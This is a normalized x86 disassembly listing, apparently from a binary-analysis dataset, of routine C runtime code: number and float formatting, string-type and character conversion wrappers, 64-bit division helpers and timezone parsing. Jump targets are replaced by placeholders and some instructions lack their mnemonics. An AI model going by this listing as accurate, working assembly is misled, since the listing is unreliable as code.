pop ecx
mov [ ebp - 0x248 ] al
mov [ ebp - 0xc ] 0x1
call sub_41685b
push eax
lea eax [ ebp - 0x248 ]
push eax
call sub_417ce3
add esp 0xc
mov [ ebp - 0xc ] eax
test eax eax
jge r-xdata
jmp r-xdata
or [ ebp - 0x3 ] 0x8
mov [ ebp - 0x34 ] 0x1
add bl 0x20
dec eax
dec eax
je r-xdata
and [ ebp - 0x4 ] 0xfffffff7
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
mov esi eax
neg edx
or [ ebp - 0x3 ] 0x1
mov edi edx
jmp r-xdata
test eax eax
jae r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_41683e
test [ ebp - 0x4 ] 0x810
pop ecx
mov ecx eax
mov [ ebp - 0x8 ] ecx
je r-xdata
mov esi 0x7fffffff
mov [ ebp - 0xc ] 0xa
sub eax 0x3
jne r-xdata
push edi
or [ ebp - 0x3 ] 0x1
lea edi [ ebp - 0x247 ]
mov [ ebp - 0x8 ] edi
lea eax [ ebp - 0x248 ]
push eax
call [ rw-data ]
pop ecx
mov [ ebp - 0xc ] eax
and [ ebp - 0x24 ] 0x0
mov [ ebp - 0x8 ] ecx
movsx eax [ eax ]
jmp r-xdata
movsx eax [ eax ]
shr eax 0x1
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x24 ] 0x1
jmp r-xdata
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
lea eax [ ebp - 0x248 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
jmp r-xdata
sub eax 0xc
jne r-xdata
lea eax [ ebp - 0x49 ]
mov [ ebp - 0x8 ] eax
and [ ebp - 0x1c ] 0x0
mov eax esi
or eax edi
jne r-xdata
test [ ebp - 0x3 ] 0x80
jne r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
mov [ ebp - 0x2c ] 0x27
jmp r-xdata
mov ebx [ ebp - 0x4 ]
test bl 0x40
je r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
mov eax [ ebp - 0xc ]
cdq
push edx
push eax
push edi
push esi
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x3c ] edx
call sub_416f00
push [ ebp - 0x3c ]
mov ebx eax
add ebx 0x30
push [ ebp - 0x40 ]
push edi
push esi
call sub_416e90
cmp ebx 0x39
mov esi eax
mov edi edx
jle r-xdata
mov eax esi
or eax edi
je r-xdata
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x24 ] 0x1
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0x8 ] ecx
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0xc ] 0x10
je r-xdata
mov esi [ ebp - 0x20 ]
sub esi [ ebp - 0x1c ]
sub esi [ ebp - 0xc ]
test bl 0xc
jne r-xdata
test bh 0x1
je r-xdata
or [ ebp - 0x3 ] 0x8
mov eax [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
mov [ eax ] bl
jmp r-xdata
add ebx [ ebp - 0x2c ]
lea eax [ ebp - 0x49 ]
sub eax [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
test [ ebp - 0x3 ] 0x2
mov [ ebp - 0xc ] eax
je r-xdata
sub eax ecx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
sub eax ecx
sar eax 0x1
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x16 ]
push [ ebp + 0x8 ]
push [ ebp - 0x1c ]
push eax
call sub_416806
add esp 0x10
test bl 0x8
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_4167d5
add esp 0x10
test bl 0x1
je r-xdata
mov [ ebp - 0x16 ] 0x2d
jmp r-xdata
mov eax [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
test eax eax
jg r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ecx ] 0x30
jne r-xdata
inc eax
jmp r-xdata
inc eax
inc eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
mov [ ebp - 0x16 ] 0x2b
jmp r-xdata
mov [ ebp - 0x1c ] 0x1
dec [ ebp - 0x8 ]
inc eax
mov ecx [ ebp - 0x8 ]
mov [ ecx ] 0x30
test eax eax
jne r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
call sub_416806
add esp 0x10
cmp [ ebp - 0xc ] 0x0
jle r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x30
call sub_4167d5
add esp 0x10
mov [ ebp - 0x16 ] 0x20
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_4167d5
add esp 0x10
mov eax [ ebp - 0xc ]
mov ebx [ ebp - 0x8 ]
lea edi [ eax - 0x1 ]
test [ ebp - 0x4 ] 0x4
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
push [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
call sub_416806
add esp 0x10
mov eax edi
dec edi
test eax eax
jne r-xdata
mov ax [ ebx ]
inc ebx
push eax
lea eax [ ebp - 0x38 ]
push eax
inc ebx
call sub_417ce3
pop ecx
test eax eax
pop ecx
jle r-xdata
jmp r-xdata
sub_4167a0
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
dec [ ecx + 0x4 ]
js r-xdata
push ecx
push [ ebp + 0x8 ]
call sub_415f47
pop ecx
pop ecx
mov edx [ ecx ]
mov al [ ebp + 0x8 ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ eax ]
pop ebp
retn
or [ eax ] 0xffffffff
pop ebp
retn
cmp eax 0xffffffff
mov eax [ ebp + 0x10 ]
jne r-xdata
sub_4167d5
push esi
push edi
mov edi [ esp + 0x10 ]
mov eax edi
dec edi
test eax eax
jle r-xdata
pop edi
pop esi
retn
mov esi [ esp + 0x18 ]
mov eax edi
dec edi
test eax eax
jg r-xdata
push esi
push [ esp + 0x18 ]
push [ esp + 0x14 ]
call sub_4167a0
add esp 0xc
cmp [ esi ] 0xffffffff
je r-xdata
sub_416806
push ebx
mov ebx [ esp + 0xc ]
mov eax ebx
dec ebx
push esi
push edi
test eax eax
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esp + 0x1c ]
mov esi [ esp + 0x10 ]
mov eax ebx
dec ebx
test eax eax
jg r-xdata
movsx eax [ esi ]
push edi
inc esi
push [ esp + 0x1c ]
push eax
call sub_4167a0
add esp 0xc
cmp [ edi ] 0xffffffff
je r-xdata
sub_416870
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
jecxz r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov ebx ecx
mov edi [ ebp + 0x8 ]
mov esi edi
xor eax eax
[ edi ]
neg ecx
add ecx ebx
mov edi esi
mov esi [ ebp + 0xc ]
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
xor ecx ecx
cmp al [ edi - 0x1 ]
ja r-xdata
not ecx
je r-xdata
dec ecx
dec ecx
sub_4168a8
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ rw-data ]
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push 0x1
pop esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ ebp + 0x1c ]
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push esi
push r--data
push esi
push ebx
call [ GetStringTypeA@IAT ]
test eax eax
je r-xdata
mov eax esi
jmp r-xdata
xor eax eax
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call [ GetStringTypeA@IAT ]
jmp r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
push ebx
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebp + 0x20 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x18 ] eax
lea esp [ ebp - 0x34 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] ebx
lea edi [ eax + eax ]
mov eax edi
add eax 0x3
and al 0xfc
call sub_411530
mov [ ebp - 0x18 ] esp
mov esi esp
mov [ ebp - 0x24 ] esi
push edi
push ebx
push esi
call sub_410a20
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je r-xdata
push [ ebp - 0x20 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
cmp eax ebx
je r-xdata
push [ ebp + 0x14 ]
push eax
push esi
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
jmp r-xdata
sub_416a03
push ebp
mov ebp esp
sub esp 0x18
fld [ r--data ]
fstp [ ebp - 0x8 ]
fld [ r--data ]
fstp [ ebp - 0x10 ]
fld [ ebp - 0x10 ]
fdiv [ ebp - 0x8 ]
fmul [ ebp - 0x8 ]
fsubr [ ebp - 0x10 ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x18 ]
fcomp [ r--data ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
leave
retn
push 0x1
pop eax
leave
retn
sub_416a41
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
jmp sub_416a03
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push 0x0
call eax
retn
sub_416a6a
push esi
mov esi [ esp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_417f0b
cmp eax 0x65
pop ecx
je r-xdata
mov cl [ rw-data ]
mov al [ esi ]
mov [ esi ] cl
inc esi
inc esi
cmp [ rw-data ] 0x1
jle r-xdata
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
pop esi
retn
movsx eax [ esi ]
mov ecx [ rw-data ]
mov al [ ecx + eax * 2 ]
and eax 0x4
movsx eax [ esi ]
push 0x4
push eax
call sub_4138b4
pop ecx
pop ecx
jmp r-xdata
test eax eax
jne r-xdata
sub_416ac4
mov eax [ esp + 0x4 ]
mov dl [ rw-data ]
mov cl [ eax ]
test cl cl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
cmp cl dl
je r-xdata
retn
mov cl [ eax ]
test cl cl
je r-xdata
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov ecx eax
cmp cl 0x65
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
cmp [ eax ] dl
jne r-xdata
cmp cl 0x45
je r-xdata
mov dl [ ecx ]
inc eax
inc ecx
test dl dl
mov [ eax ] dl
jne r-xdata
dec eax
inc eax
jmp r-xdata
sub_416b2a
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_418404
mov eax [ ebp + 0xc ]
pop ecx
pop ecx
mov ecx [ ebp + 0x10 ]
mov [ eax ] ecx
leave
retn
lea eax [ ebp - 0x8 ]
push eax
call sub_4183d7
mov eax [ ebp + 0xc ]
pop ecx
pop ecx
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn
sub_416b68
push ebp
mov ebp esp
sub esp 0x28
lea eax [ ebp - 0x28 ]
push esi
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push ecx
push ecx
fld [ eax ]
fstp [ esp ]
call sub_4184a8
mov esi [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp + 0xc ]
lea eax [ esi + 0x1 ]
push eax
xor eax eax
cmp [ ebp - 0x10 ] 0x2d
sete al
xor ecx ecx
test esi esi
setg cl
add edx eax
add ecx edx
push ecx
call sub_418431
lea eax [ ebp - 0x10 ]
push 0x0
push eax
push [ ebp + 0x14 ]
push esi
push [ ebp + 0xc ]
call sub_416bc9
mov eax [ ebp + 0xc ]
add esp 0x30
pop esi
leave
retn
sub_416bc9
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x18 ] bl
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0x8 ]
je r-xdata
cmp [ esi ] 0x2d
mov eax edi
jne r-xdata
xor eax eax
cmp [ ebp + 0xc ] ebx
setg al
push eax
xor eax eax
cmp [ esi ] 0x2d
sete al
add eax edi
push eax
call sub_416e6b
pop ecx
pop ecx
cmp [ ebp + 0xc ] ebx
jle r-xdata
mov [ edi ] 0x2d
lea eax [ edi + 0x1 ]
xor ecx ecx
cmp [ ebp + 0x18 ] bl
push r--data
sete cl
add ecx eax
add ecx [ ebp + 0xc ]
push ecx
call sub_415bf0
cmp [ ebp + 0x10 ] ebx
pop ecx
pop ecx
mov ecx eax
je r-xdata
mov dl [ eax + 0x1 ]
lea ecx [ eax + 0x1 ]
mov [ eax ] dl
mov eax ecx
mov cl [ rw-data ]
mov [ eax ] cl
mov eax [ esi + 0xc ]
inc ecx
cmp [ eax ] 0x30
je r-xdata
mov [ ecx ] 0x45
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ esi + 0x4 ]
dec ebx
jns r-xdata
inc ecx
cmp ebx 0x64
jl r-xdata
neg ebx
mov [ ecx ] 0x2d
inc ecx
cmp ebx 0xa
jl r-xdata
mov eax ebx
push 0x64
cdq
pop esi
idiv esi
add [ ecx ] al
mov eax ebx
cdq
idiv esi
mov ebx edx
add [ ecx + 0x1 ] bl
mov eax ebx
push 0xa
cdq
pop esi
idiv esi
add [ ecx ] al
mov eax ebx
cdq
idiv esi
mov ebx edx
sub_416c8b
push ebp
mov ebp esp
sub esp 0x28
lea eax [ ebp - 0x28 ]
push esi
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push ecx
push ecx
fld [ eax ]
fstp [ esp ]
call sub_4184a8
mov esi [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
add eax esi
push eax
xor eax eax
cmp [ ebp - 0x10 ] 0x2d
sete al
add eax [ ebp + 0xc ]
push eax
call sub_418431
lea eax [ ebp - 0x10 ]
push 0x0
push eax
push esi
push [ ebp + 0xc ]
call sub_416ce0
mov eax [ ebp + 0xc ]
add esp 0x2c
pop esi
leave
retn
sub_416ce0
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push edi
mov eax [ esi + 0x4 ]
dec eax
cmp [ ebp + 0x14 ] 0x0
je r-xdata
cmp [ esi ] 0x2d
mov edi ebx
jne r-xdata
cmp eax [ ebp + 0xc ]
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jg r-xdata
mov [ ebx ] 0x2d
lea edi [ ebx + 0x1 ]
xor ecx ecx
cmp [ esi ] 0x2d
sete cl
add ecx eax
add ecx ebx
mov eax ecx
mov [ eax ] 0x30
and [ eax + 0x1 ] 0x0
add edi eax
push 0x1
push edi
call sub_416e6b
pop ecx
mov [ edi ] 0x30
pop ecx
inc edi
jmp r-xdata
pop edi
mov eax ebx
pop esi
pop ebx
pop ebp
retn
push 0x1
push edi
call sub_416e6b
mov al [ rw-data ]
pop ecx
mov [ edi ] al
mov esi [ esi + 0x4 ]
inc edi
pop ecx
test esi esi
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
neg esi
cmp [ ebp + 0xc ] esi
jl r-xdata
neg esi
jmp r-xdata
push [ ebp + 0xc ]
push edi
call sub_416e6b
push [ ebp + 0xc ]
push 0x30
push edi
call sub_410a20
add esp 0x14
mov [ ebp + 0xc ] esi
sub_416d87
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
lea eax [ ebp - 0x28 ]
push edi
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push ecx
push ecx
fld [ eax ]
fstp [ esp ]
call sub_4184a8
mov eax [ ebp - 0xc ]
mov ebx [ ebp + 0x10 ]
lea esi [ eax - 0x1 ]
xor eax eax
cmp [ ebp - 0x10 ] 0x2d
sete al
add eax [ ebp + 0xc ]
mov edi eax
lea eax [ ebp - 0x10 ]
push eax
push ebx
push edi
call sub_418431
mov eax [ ebp - 0xc ]
add esp 0x1c
dec eax
cmp esi eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
lea eax [ ebp - 0x10 ]
push 0x1
push eax
push [ ebp + 0x14 ]
push ebx
push [ ebp + 0xc ]
call sub_416bc9
add esp 0x14
cmp eax ebx
jge r-xdata
test cl cl
je r-xdata
lea eax [ ebp - 0x10 ]
push 0x1
push eax
push ebx
push [ ebp + 0xc ]
call sub_416ce0
add esp 0x10
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
and [ edi - 0x2 ] al
sub_416e1a
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x65
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_416b68
cmp [ ebp + 0x10 ] 0x45
je r-xdata
cmp [ ebp + 0x10 ] 0x66
jne r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_416d87
jmp r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_416c8b
add esp 0xc
pop ebp
retn
add esp 0x10
pop ebp
retn
sub_416e6b
push edi
mov edi [ esp + 0xc ]
test edi edi
je r-xdata
pop edi
retn
push esi
mov esi [ esp + 0xc ]
push esi
call sub_411a10
inc eax
push eax
push esi
add esi edi
push esi
call sub_411580
add esp 0x10
pop esi
sub_416e90
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_416f00
push ebx
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov eax [ esp + 0x8 ]
div ecx
mov eax edx
xor edx edx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov ecx eax
mul [ esp + 0x14 ]
xchg ecx eax
mul [ esp + 0x10 ]
add edx ecx
jb r-xdata
pop ebx
retn 0x10
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_416f75
cmp [ rw-data ] 0x0
jne r-xdata
retn
push 0xb
call sub_4136da
cmp [ rw-data ] 0x0
pop ecx
jne r-xdata
push 0xb
call sub_41373b
pop ecx
call sub_416fa3
inc [ rw-data ]
sub_416fa3
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
push 0xc
pop edi
xor ebx ebx
push edi
mov [ ebp - 0x8 ] ebx
call sub_4136da
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
mov [ rw-data ] ebx
mov [ esp ] r--data
call sub_4185c3
mov esi eax
pop ecx
cmp esi ebx
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
push edi
call sub_41373b
mov [ esp ] rw-data
call [ GetTimeZoneInformation@IAT ]
cmp eax 0xffffffff
je r-xdata
push edi
call sub_41373b
pop ecx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
mov ecx [ rw-data ]
imul eax eax 0x3c
cmp [ rw-data ] bx
push 0x1
pop edx
mov [ rw-data ] eax
mov [ rw-data ] edx
je r-xdata
push [ rw-data ]
call sub_410cc6
push esi
call sub_411a10
inc eax
push eax
call sub_410b8c
add esp 0xc
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push eax
push esi
call sub_413750
pop ecx
test eax eax
pop ecx
je r-xdata
cmp [ rw-data ] bx
je r-xdata
mov esi ecx
imul esi esi 0x3c
add eax esi
mov [ rw-data ] eax
push esi
push eax
call sub_415bf0
push edi
call sub_41373b
push 0x3
push esi
push [ rw-data ]
call sub_417750
mov eax [ rw-data ]
add esi 0x3
add esp 0x18
and [ eax + 0x3 ] 0x0
cmp [ esi ] 0x2d
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push esi
call sub_4107ec
pop ecx
mov bl 0x30
mov ecx eax
imul ecx ecx 0xe10
mov [ rw-data ] ecx
mov [ ebp - 0x8 ] 0x1
inc esi
mov eax [ rw-data ]
and [ eax ] 0x0
cmp [ ebp - 0x4 ] ebx
jne r-xdata
sub eax ecx
mov [ rw-data ] edx
imul eax eax 0x3c
mov [ rw-data ] eax
jmp r-xdata
inc esi
jmp r-xdata
cmp al bl
jl r-xdata
mov eax [ rw-data ]
and [ eax ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
mov eax [ rw-data ]
and [ eax + 0x3f ] 0x0
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov esi [ WideCharToMultiByte@IAT ]
push eax
push ebx
push 0x3f
mov edi 0x220
push [ rw-data ]
push 0xffffffff
push rw-data
push edi
push [ rw-data ]
call esi
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x2b
je r-xdata
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
mov eax [ rw-data ]
and [ eax + 0x3f ] 0x0
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push ebx
push 0x3f
push [ rw-data ]
push 0xffffffff
push rw-data
push edi
push [ rw-data ]
call esi
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
inc esi
push esi
call sub_4107ec
imul eax eax 0x3c
pop ecx
mov ecx [ rw-data ]
add ecx eax
mov [ rw-data ] ecx
movsx eax [ esi ]
test eax eax
mov [ rw-data ] eax
je r-xdata
neg ecx
mov [ rw-data ] ecx
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
push 0x3
push esi
push [ rw-data ]
call sub_417750
mov eax [ rw-data ]
add esp 0xc
and [ eax + 0x3 ] 0x0
jmp r-xdata
inc esi
push esi
call sub_4107ec
pop ecx
mov ecx [ rw-data ]
add ecx eax
mov [ rw-data ] ecx
inc esi
jmp r-xdata
cmp al 0x39
jg r-xdata
mov al [ esi ]
cmp al bl
jl r-xdata
inc esi
jmp r-xdata
mov al [ esi ]
cmp al bl
jl r-xdata
sub_41724b
push ebx
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
mov esi [ esp + 0x10 ]
push 0x1
pop ebx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] edi
je r-xdata
cmp eax [ rw-data ]
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push edi
push edi
push 0x2
push edi
push edi
push ebx
push 0x4
push eax
push ebx
push ebx
call sub_4173f7
push edi
push edi
push edi
push 0x2
push edi
push edi
push 0x5
push 0xa
push [ esi + 0x14 ]
push ebx
push edi
call sub_4173f7
add esp 0x58
movzx ecx [ rw-data ]
push ecx
cmp [ rw-data ] di
movzx ecx [ rw-data ]
push ecx
movzx ecx [ rw-data ]
push ecx
movzx ecx [ rw-data ]
push ecx
jne r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
mov ecx [ esi + 0x1c ]
cmp edx eax
jge r-xdata
cmp ecx eax
jl r-xdata
cmp ecx edx
jl r-xdata
movzx ecx [ rw-data ]
push ecx
push edi
movzx ecx [ rw-data ]
push edi
push ecx
push eax
push edi
movzx ecx [ rw-data ]
push edi
push ecx
movzx ecx [ rw-data ]
push ecx
movzx ecx [ rw-data ]
push ecx
push eax
push ebx
jmp r-xdata
mov eax ebx
cmp ecx edx
jg r-xdata
cmp ecx eax
jg r-xdata
movzx eax [ rw-data ]
push eax
push edi
movzx eax [ rw-data ]
push edi
push eax
push [ esi + 0x14 ]
push edi
jmp r-xdata
movzx eax [ rw-data ]
push edi
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
push [ esi + 0x14 ]
push ebx
push ebx
call sub_4173f7
movzx eax [ rw-data ]
add esp 0x2c
cmp [ rw-data ] di
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
jne r-xdata
cmp ecx eax
jle r-xdata
cmp ecx edx
jle r-xdata
push edi
call sub_4173f7
add esp 0x2c
jmp r-xdata
mov eax [ esi + 0x8 ]
imul eax eax 0x3c
add eax [ esi + 0x4 ]
imul eax eax 0x3c
add eax [ esi ]
imul eax eax 0x3e8
cmp ecx edx
jne r-xdata
cmp ecx edx
jl r-xdata
cmp ecx eax
jge r-xdata
xor ecx ecx
cmp eax [ rw-data ]
setl cl
jmp r-xdata
xor ecx ecx
cmp eax [ rw-data ]
setge cl
mov eax ecx
jmp r-xdata
sub_4173f7
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
push ebx
mov ebx [ ebp + 0x10 ]
push esi
jne r-xdata
mov eax [ ebp + 0x14 ]
test bl 0x3
jne r-xdata
mov eax [ ebp + 0x14 ]
mov [ ebp + 0x10 ] ebx
and [ ebp + 0x10 ] 0x3
mov esi eax
jne r-xdata
mov ecx [ eax * 4 + rw-data ]
mov ecx [ eax * 4 + rw-data ]
jmp r-xdata
shl esi 0x2
mov eax [ esi + rw-data ]
shl esi 0x2
mov eax [ esi + rw-data ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
mov [ rw-data ] ecx
imul eax eax 0x3c
add eax [ ebp + 0x28 ]
imul eax eax 0x3c
add eax [ rw-data ]
add eax [ ebp + 0x2c ]
imul eax eax 0x3e8
add eax [ ebp + 0x30 ]
mov [ rw-data ] eax
jns r-xdata
mov eax [ ebp + 0x24 ]
mov [ rw-data ] ecx
imul eax eax 0x3c
add eax [ ebp + 0x28 ]
mov [ rw-data ] ebx
imul eax eax 0x3c
add eax [ ebp + 0x2c ]
imul eax eax 0x3e8
add eax [ ebp + 0x30 ]
mov [ rw-data ] eax
jmp r-xdata
add ecx [ ebp + 0x20 ]
imul eax eax 0x7
sub eax edx
add eax [ ebp + 0x1c ]
add ecx eax
imul eax eax 0x7
sub eax edx
add eax [ ebp + 0x1c ]
lea ecx [ ecx + eax - 0x7 ]
jmp r-xdata
mov edx ebx
lea ecx [ eax + 0x1 ]
imul edx edx 0x16d
lea eax [ ebx - 0x1 ]
push edi
sar eax 0x2
mov edi ecx
push 0x7
add edi eax
lea eax [ edx + edi - 0x63db ]
pop edi
cdq
idiv edi
mov eax [ ebp + 0x18 ]
pop edi
cmp edx [ ebp + 0x1c ]
jg r-xdata
mov edx 0x5265c00
cmp eax edx
jl r-xdata
add eax 0x5265c00
dec ecx
mov [ rw-data ] eax
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x18 ] 0x5
jne r-xdata
mov [ rw-data ] ebx
sub eax edx
inc ecx
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov esi [ esi + rw-data ]
mov esi [ esi + rw-data ]
jmp r-xdata
sub ecx 0x7
jmp r-xdata
cmp ecx esi
jle r-xdata
sub_417540
push ebp
mov ebp esp
push edi
push esi
push ebx
